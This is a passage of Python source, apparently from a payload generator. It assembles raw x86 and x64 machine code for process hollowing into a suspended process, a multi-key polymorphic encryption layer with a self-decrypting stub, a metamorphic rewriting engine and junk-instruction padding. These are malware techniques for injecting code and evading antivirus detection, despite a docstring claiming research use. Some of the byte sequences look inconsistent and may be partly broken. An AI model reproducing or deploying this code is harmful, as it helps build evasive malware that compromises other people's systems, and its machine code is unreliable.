                b"\x56"  # push esi (lpCommandLine)
                b"\x6a\x00"  # push 0 (lpApplicationName)
                # Call CreateProcessA
                b"\xff\x15\x00\x00\x00\x00"  # call [CreateProcessA]
                b"\x85\xc0"  # test eax, eax
                b"\x74\x3f"  # jz error_exit
                # Get process handle and prepare for hollowing
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x50"  # push eax
                # NtUnmapViewOfSection
                b"\x68\x00\x40\x00\x00"  # push 0x400000 (base address)
                b"\x50"  # push eax (process handle)
                b"\xff\x15\x00\x00\x00\x00"  # call [NtUnmapViewOfSection]
                # VirtualAllocEx for new image
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x68\x40\x00\x00\x00"  # push PAGE_EXECUTE_READWRITE
                b"\x68\x00\x30\x00\x00"  # push MEM_COMMIT | MEM_RESERVE
                b"\x68\x00\x10\x00\x00"  # push 0x1000 (size)
                b"\x68\x00\x40\x00\x00"  # push 0x400000 (base address)
                b"\x50"  # push eax (process handle)
                b"\xff\x15\x00\x00\x00\x00"  # call [VirtualAllocEx]
                # WriteProcessMemory (payload injection point)
                b"\x6a\x00"  # push 0 (lpNumberOfBytesWritten)
                # Payload length and data would be inserted here
                b"\x8b\x03"  # mov eax, [ebx] (hProcess)
                b"\x50"  # push eax
                b"\xff\x15\x00\x00\x00\x00"  # call [WriteProcessMemory]
                # ResumeThread
                b"\x8b\x43\x04"  # mov eax, [ebx+4] (hThread)
                b"\x50"  # push eax
                b"\xff\x15\x00\x00\x00\x00"  # call [ResumeThread]
                # Cleanup and exit
                b"\x31\xc0"  # xor eax, eax
                b"\xc3"  # ret
            )
        else:  # x64
            hollowing_stub = (
                # x64 process hollowing implementation
                b"\x48\x83\xec\x68"  # sub rsp, 104 (stack space)
                b"\x48\x31\xc9"  # xor rcx, rcx
                # Prepare target process path
                b"\x48\x8d\x15\x80\x00\x00\x00"  # lea rdx, [rel process_path]
                # Set up STARTUPINFO
                b"\x48\x8d\x44\x24\x20"  # lea rax, [rsp+32]
                b"\x48\x31\xdb"  # xor rbx, rbx
                b"\x48\x89\x18"  # mov [rax], rbx (zero first qword)
                b"\xc7\x00\x5c\x00\x00\x00"  # mov dword [rax], 92 (cb)
                # Set up PROCESS_INFORMATION
                b"\x48\x8d\x4c\x24\x40"  # lea rcx, [rsp+64]
                b"\x48\x31\xc0"  # xor rax, rax
                b"\x48\x89\x01"  # mov [rcx], rax
                b"\x48\x89\x41\x08"  # mov [rcx+8], rax
                # CreateProcessA call setup
                b"\x45\x31\xc9"  # xor r9d, r9d (lpCurrentDirectory)
                b"\x41\x50"  # push r8 (lpEnvironment = 0)
                b"\x6a\x04"  # push CREATE_SUSPENDED
                b"\x45\x31\xc0"  # xor r8d, r8d (bInheritHandles)
                b"\x48\x31\xd2"  # xor rdx, rdx (lpThreadAttributes)
                b"\x48\x31\xc9"  # xor rcx, rcx (lpProcessAttributes)
                # Additional parameters in registers/stack for x64 calling convention
                # Call CreateProcessA (address would be resolved at runtime)
                b"\xff\x15\x00\x00\x00\x00"  # call [CreateProcessA]
                b"\x48\x85\xc0"  # test rax, rax
                b"\x74\x50"  # jz error_exit
                # Get process handle for hollowing
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                # NtUnmapViewOfSection
                b"\x48\xba\x00\x40\x00\x00\x00\x00\x00\x00"  # mov rdx, 0x400000
                b"\xff\x15\x00\x00\x00\x00"  # call [NtUnmapViewOfSection]
                # VirtualAllocEx for payload
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                b"\x48\xba\x00\x40\x00\x00\x00\x00\x00\x00"  # mov rdx, 0x400000
                b"\x41\xb8\x00\x10\x00\x00"  # mov r8d, 0x1000 (size)
                b"\x41\xb9\x00\x30\x00\x00"  # mov r9d, MEM_COMMIT|MEM_RESERVE
                b"\x68\x40\x00\x00\x00"  # push PAGE_EXECUTE_READWRITE
                b"\xff\x15\x00\x00\x00\x00"  # call [VirtualAllocEx]
                # WriteProcessMemory (injection point)
                b"\x48\x8b\x4c\x24\x40"  # mov rcx, [rsp+64] (hProcess)
                # Payload data setup would go here
                b"\xff\x15\x00\x00\x00\x00"  # call [WriteProcessMemory]
                # ResumeThread
                b"\x48\x8b\x4c\x24\x48"  # mov rcx, [rsp+72] (hThread)
                b"\xff\x15\x00\x00\x00\x00"  # call [ResumeThread]
                # Cleanup
                b"\x48\x83\xc4\x68"  # add rsp, 104
                b"\xc3"  # ret
            )

        return hollowing_stub + shellcode

    def _add_polymorphic_layer(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add polymorphic encryption layer for security research purposes.

        WARNING: This implementation is for legitimate security research,
        penetration testing, and defensive analysis only.
        """
        self.logger.debug(f"Adding enhanced polymorphic layer for {architecture.value}")

        import random
        import struct

        # Generate multiple random keys for multi-stage encryption
        key1 = random.randint(1, 255)
        key2 = random.randint(1, 255)
        key3 = random.randint(1, 255)

        # Multi-stage encryption with varying keys
        encrypted = bytearray(shellcode)

        # Stage 1: XOR with rotating key
        for i in range(len(encrypted)):
            encrypted[i] ^= (key1 + i) % 256

        # Stage 2: ADD operation with second key
        for i in range(len(encrypted)):
            encrypted[i] = (encrypted[i] + key2) % 256

        # Stage 3: XOR with third key
        for i in range(len(encrypted)):
            encrypted[i] ^= key3

        if architecture == Architecture.X86:
            # Enhanced x86 polymorphic decryptor with multiple stages
            decryptor = (
                # Junk instructions for polymorphism
                b"\x90\x90"  # nop nop
                b"\xeb\x02"  # jmp +2
                b"\xeb\xfe"  # infinite loop (skipped)
                # Get shellcode address using call/pop technique
                b"\xe8\x00\x00\x00\x00"  # call next_instruction
                b"\x5e"  # pop esi (get current address)
                b"\x83\xc6\x20"  # add esi, 32 (adjust to shellcode)
                # Set up decryption loop
                b"\x31\xc9"  # xor ecx, ecx
                b"\xb9"
                + struct.pack("<I", len(shellcode))  # mov ecx, shellcode_len
                + b"\x31\xed"  # xor ebp, ebp (counter)
                # Stage 1: Reverse XOR with third key
                b"\x80\x36"
                + bytes([key3])  # xor byte [esi], key3
                +
                # Stage 2: Reverse ADD with second key
                b"\x80\x2e"
                + bytes([key2])  # sub byte [esi], key2
                +
                # Stage 3: Reverse rotating XOR
                b"\x89\xeb"  # mov ebx, ebp
                b"\x81\xc3"
                + bytes([key1])  # add ebx, key1
                + b"\x80\xe3\xff"  # and bl, 0xff
                b"\x30\x1e"  # xor [esi], bl
                # Loop control
                b"\x46"  # inc esi
                b"\x45"  # inc ebp
                b"\xe2\xed"  # loop decrypt_stage1
                # More junk instructions
                b"\x90\x90\x90"  # nop nop nop
                b"\xeb\x01"  # jmp +1
                b"\x90"  # nop (alignment)
            )
        else:  # x64
            decryptor = (
                # x64 enhanced polymorphic decryptor
                b"\x90\x90\x90"  # nop nop nop (junk)
                b"\xeb\x02"  # jmp +2
                b"\xeb\xfe"  # infinite loop (skipped)
                # Get shellcode address
                b"\xe8\x00\x00\x00\x00"  # call next_instruction
                b"\x5e"  # pop rsi
                b"\x48\x83\xc6\x30"  # add rsi, 48 (adjust to shellcode)
                # Set up decryption
                b"\x48\x31\xc9"  # xor rcx, rcx
                b"\x48\xb9"
                + struct.pack("<Q", len(shellcode))  # mov rcx, shellcode_len
                + b"\x48\x31\xed"  # xor rbp, rbp (counter)
                # Multi-stage decryption loop
                b"\x80\x36"
                + bytes([key3])  # xor byte [rsi], key3
                + b"\x80\x2e"
                + bytes([key2])  # sub byte [rsi], key2
                +
                # Rotating key calculation
                b"\x48\x89\xeb"  # mov rbx, rbp
                b"\x48\x81\xc3"
                + bytes([key1])
                + b"\x00\x00\x00"  # add rbx, key1
                + b"\x80\xe3\xff"  # and bl, 0xff
                b"\x30\x1e"  # xor [rsi], bl
                # Loop control
                b"\x48\xff\xc6"  # inc rsi
                b"\x48\xff\xc5"  # inc rbp
                b"\xe2\xe8"  # loop decrypt_loop
                # Additional junk
                b"\x90\x90\x90\x90"  # nop padding
            )

        return bytes(decryptor + encrypted)

    def _add_metamorphic_engine(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add metamorphic transformation engine."""
        self.logger.debug(f"Adding metamorphic engine for {architecture.value}")

        # Production-ready metamorphic engine with multiple transformation techniques
        bytearray()

        if architecture == Architecture.X86:
            # Build transformation rule table

            # Metamorphic engine code generator
            engine = bytearray()

            # Save context
            engine.extend([0x60])  # PUSHAD
            engine.extend([0x9c])  # PUSHFD

            # Get runtime address (GetPC technique)
            engine.extend([
                0xe8, 0x00, 0x00, 0x00, 0x00,  # CALL $+5
                0x5e,  # POP ESI (ESI = current EIP)
                0x83, 0xc6, 0x30,  # ADD ESI, 0x30 (skip to payload)
            ])

            # Allocate memory for transformed code
            engine.extend([
                0x6a, 0x40,  # PUSH 0x40 (PAGE_EXECUTE_READWRITE)
                0x68, 0x00, 0x30, 0x00, 0x00,  # PUSH 0x3000 (MEM_COMMIT | MEM_RESERVE)
            ])
            engine.extend(struct.pack('<I', len(shellcode) * 2))  # Size
            engine.extend([
                0x6a, 0x00,  # PUSH 0 (lpAddress)
                0xb8, 0x00, 0x00, 0x00, 0x00,  # MOV EAX, VirtualAlloc (to be resolved)
                0xff, 0xd0,  # CALL EAX
                0x89, 0xc7,  # MOV EDI, EAX (destination)
            ])

            # Transformation loop with pattern matching
            engine.extend([
                0xb9,  # MOV ECX, length
            ])
            engine.extend(struct.pack('<I', len(shellcode)))

            # Main transformation loop
            len(engine)
            engine.extend([
                0x8a, 0x06,  # MOV AL, [ESI]
                0x46,  # INC ESI

                # Check for transformation patterns
                0x3c, 0x31,  # CMP AL, 0x31 (XOR opcode)
                0x75, 0x15,  # JNE not_xor
                0x8a, 0x1e,  # MOV BL, [ESI]
                0x80, 0xfb, 0xc0,  # CMP BL, 0xC0
                0x72, 0x0e,  # JB not_xor_reg
                0x80, 0xfb, 0xd2,  # CMP BL, 0xD2
                0x77, 0x08,  # JA not_xor_reg

                # Apply XOR transformation
                0x0f, 0xb6, 0xd0,  # MOVZX EDX, AL
                0xe8, 0x20, 0x00, 0x00, 0x00,  # CALL get_random
                0x24, 0x03,  # AND AL, 3
                0x74, 0x02,  # JZ use_original
                0xb0, 0x33,  # MOV AL, 0x33 (alternative XOR)

                # not_xor:
                0x3c, 0x90,  # CMP AL, 0x90 (NOP)
                0x75, 0x0a,  # JNE not_nop
                0xe8, 0x10, 0x00, 0x00, 0x00,  # CALL get_random
                0x24, 0x01,  # AND AL, 1
                0x74, 0x02,  # JZ use_nop
                0xb0, 0x87,  # MOV AL, 0x87 (XCHG)
                0xb3, 0xdb,  # MOV BL, 0xDB
                0x88, 0x1f,  # MOV [EDI], BL
                0x47,  # INC EDI

                # Write transformed byte
                0x88, 0x07,  # MOV [EDI], AL
                0x47,  # INC EDI
                0x49,  # DEC ECX
                0x75, 0xc5,  # JNZ transform_loop
            ])

            # Add random number generator
            engine.extend([
                # get_random:
                0x0f, 0x31,  # RDTSC
                0xc3,  # RET
            ])

            # Jump to transformed code
            engine.extend([
                0x61,  # POPAD
                0x9d,  # POPFD
                0xff, 0xe7,  # JMP EDI
            ])

            # Add garbage instructions
            garbage = self._generate_garbage_instructions(Architecture.X86, random.randint(10, 30))

        else:  # x64
            # x64 metamorphic engine

            engine = bytearray()

            # Save all registers
            engine.extend([
                0x50, 0x53, 0x51, 0x52, 0x56, 0x57,  # PUSH RAX,RBX,RCX,RDX,RSI,RDI
                0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,  # PUSH R8-R11
                0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,  # PUSH R12-R15
            ])

            # Get runtime address
            engine.extend([
                0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00,  # LEA RSI, [RIP]
                0x48, 0x83, 0xc6, 0x50,  # ADD RSI, 0x50 (skip to payload)
            ])

            # Allocate executable memory
            engine.extend([
                0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,  # MOV RCX, 0 (lpAddress)
                0x48, 0xba,  # MOV RDX, size
            ])
            engine.extend(struct.pack('<Q', len(shellcode) * 2))
            engine.extend([
                0x41, 0xb8, 0x00, 0x30, 0x00, 0x00,  # MOV R8D, MEM_COMMIT | MEM_RESERVE
                0x41, 0xb9, 0x40, 0x00, 0x00, 0x00,  # MOV R9D, PAGE_EXECUTE_READWRITE
                0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # MOV RAX, VirtualAlloc
                0xff, 0xd0,  # CALL RAX
                0x48, 0x89, 0xc7,  # MOV RDI, RAX
            ])

            # Transformation loop
            engine.extend([
                0x48, 0xb9,  # MOV RCX, length
            ])
            engine.extend(struct.pack('<Q', len(shellcode)))

            # Apply transformations
            engine.extend([
                # transform_loop:
                0x48, 0x31, 0xc0,  # XOR RAX, RAX
                0x8a, 0x06,  # MOV AL, [RSI]
                0x48, 0xff, 0xc6,  # INC RSI

                # Pattern matching and substitution
                0x3c, 0x48,  # CMP AL, 0x48 (REX.W prefix)
                0x75, 0x20,  # JNE not_rex
                0x8a, 0x1e,  # MOV BL, [RSI]
                0x80, 0xfb, 0x31,  # CMP BL, 0x31 (XOR)
                0x75, 0x18,  # JNE not_xor64

                # Get random transformation
                0x0f, 0x31,  # RDTSC
                0x83, 0xe0, 0x03,  # AND EAX, 3
                0x74, 0x06,  # JZ use_original64
                0x80, 0xfb, 0x33,  # CMP BL, 0x33
                0x74, 0x02,  # JE already_alt
                0xb3, 0x33,  # MOV BL, 0x33 (alternative)
                0x88, 0x07,  # MOV [RDI], AL
                0x48, 0xff, 0xc7,  # INC RDI
                0x88, 0x1f,  # MOV [RDI], BL
                0x48, 0xff, 0xc7,  # INC RDI
                0x48, 0xff, 0xc6,  # INC RSI
                0xeb, 0x05,  # JMP continue

                # not_rex:
                0x88, 0x07,  # MOV [RDI], AL
                0x48, 0xff, 0xc7,  # INC RDI

                # continue:
                0x48, 0xff, 0xc9,  # DEC RCX
                0x75, 0xc8,  # JNZ transform_loop
            ])

            # Restore registers and jump
            engine.extend([
                0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c,  # POP R15-R12
                0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58,  # POP R11-R8
                0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58,  # POP RDI,RSI,RDX,RCX,RBX,RAX
                0xff, 0xe7,  # JMP RDI
            ])

            garbage = self._generate_garbage_instructions(Architecture.X64, random.randint(10, 30))

        return engine + garbage + shellcode

    def _generate_garbage_instructions(self, arch: Architecture, count: int) -> bytes:
        """Generate polymorphic garbage instructions."""
        garbage = bytearray()

        if arch == Architecture.X86:
            instructions = [
                b"\x90",  # NOP
                b"\x87\xdb",  # XCHG EBX, EBX
                b"\x89\xc0",  # MOV EAX, EAX
                b"\xf8",  # CLC
                b"\xf9",  # STC
                b"\x9f",  # LAHF
                b"\xd6",  # SALC
                b"\x98",  # CBW
                b"\x99",  # CDQ
            ]
        else:  # x64
            instructions = [
                b"\x90",  # NOP
                b"\x48\x87\xdb",  # XCHG RBX, RBX
                b"\x48\x89\xc0",  # MOV RAX, RAX
                b"\x0f\x1f\x00",  # Multi-byte NOP
                b"\x0f\x1f\x40\x00",  # Multi-byte NOP
                b"\x0f\x1f\x44\x00\x00",  # Multi-byte NOP
                b"\x66\x0f\x1f\x44\x00\x00",  # Multi-byte NOP
                b"\x0f\x1f\x80\x00\x00\x00\x00",  # Multi-byte NOP
            ]

        for _ in range(count):
            garbage.extend(random.choice(instructions))

        return bytes(garbage)
